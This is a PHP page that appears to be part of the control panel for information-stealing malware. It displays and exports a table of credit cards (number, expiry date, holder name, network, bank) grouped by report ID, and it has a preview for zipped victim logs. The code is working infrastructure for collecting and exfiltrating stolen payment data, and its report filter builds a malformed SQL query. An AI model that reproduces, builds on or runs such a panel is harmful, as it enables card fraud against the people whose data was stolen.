<?php
require_once('common.php');
require_once('global.php');

if (isset($_GET['action']) && $_GET['action'] === 'exportCards')
{
	$exportInfo = '';
	$query = 'SELECT card_number, exp_date, holder_name, bank_name FROM `credit_cards`';
	$cards = mysqlQuery($query);
	for ($i = 0; $i < count($cards); ++$i)
	{
		$elem = $cards[$i];
		$data = sprintf("Card number: %s\r\nExpiration date: %s\r\nHolder name: %s\r\nBank name: %s\r\n\r\n",
			$elem['card_number'], $elem['exp_date'], $elem['holder_name'], $elem['bank_name']);
		$exportInfo .= $data;
	}
	if ($cards)
	{
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=creditCards.txt');
		header('Expires: 0');
		header('Pragma: no-cache');
		header('Content-Length: ' . strlen($exportInfo));
		flush();
		echo $exportInfo;
		die();
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<link rel="shortcut icon" type="image/png" href="img/favicon.png" />
	<link rel="stylesheet" href="css/jquery.fancybox.min.css" />
	<script src="js/functions.js"></script>
	<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
	<script src="js/jquery.fancybox.min.js"></script>
</head>

<body>

	<?php $type="creditCards"; require_once('nav_bar.php'); ?>

	<div class="modal-window" id="implinks-preview" style="display: none;">
		<p data-selectable="true" id="implinks_data"></p>
	</div>

	<div class="modal-window" id="log-preview" style="display: none;">
		<h3>
			<i class="fas fa-file-archive" style="margin-right: 5px;"></i> archive.zip
		</h3>

		<table>
			<thead>
				<tr>
					<th>Filename</th>
					<th>Size</th>
				</tr>
			</thead>

			<tbody id="log_data"></tbody>
		</table>

		<button id="preview-download" class="modal-button">
			<i class="fas fa-download" style="margin-right: 5px;"></i> Download
		</button>
	</div>

	<div class="main-info">
		<form>
			<table>
				<tbody>
					<tr>
						<td class="content-subheading">Report ID: </td>
						<td>
							<input class="edit" name="rep_id" />
						</td>
					</tr>
				</tbody>
			</table>
			<button class="example_a" type="submit" style="margin-left: 5px; margin-top: 30px; margin-bottom: 40px;">
				<i class="fas fa-filter" style="margin-right: 5px;"></i> Filter
			</button>
		</form>

		<div style="margin: 25px 0 5px 10px;">
            <button class="button-inline" onclick="window.location.href = 'reports.php?action=exportCards';">
                <i class="fa fa-file-export"></i>Export cards
            </button>
		</div>

		<br />


        <?php
		$query = 'SELECT rep_id, card_number, exp_date, holder_name, network, bank_name FROM `credit_cards`';

		if (isset($_GET['rep_id']) && is_numeric($_GET['rep_id'])) $query .= ' AND credit_cards.rep_id='.$_GET['rep_id'];

        $results = mysqlQuery($query);
        echo sprintf("<p class='content-subheading'>Cards count: %d</p>", count($results));
        ?>
		<table class="darkTable cred-tab">
			<thead>
				<tr>
					<th>Report ID</th>
					<th>Card Number</th>
					<th>Expiration Date</th>
					<th>Holder Name</th>
					<th>Network</th>
					<th>Bank Name</th>
				</tr>
			</thead>

			<tbody id="main_items">
				<?php
				

				for ($i = 0; $i < count($results); ++$i) {
					$rep_id = $results[$i]['rep_id'];
					echo "<tr>";
					echo "<td data-label='Report id'>$rep_id</td>";
					echo "<td data-label='Card Number'>{$results[$i]['card_number']}</td>";
					echo "<td data-label='Expiration Date'>{$results[$i]['exp_date']}</td>";
					echo "<td data-label='Holder Name'>{$results[$i]['holder_name']}</td>";
					echo "<td data-label='Network'>{$results[$i]['network']}</td>";
					echo "<td data-label='Bank Name'>{$results[$i]['bank_name']}</td>";
					echo "</tr>";
				}
				?>
			</tbody>
		</table>
	</div>


</body>
</html>
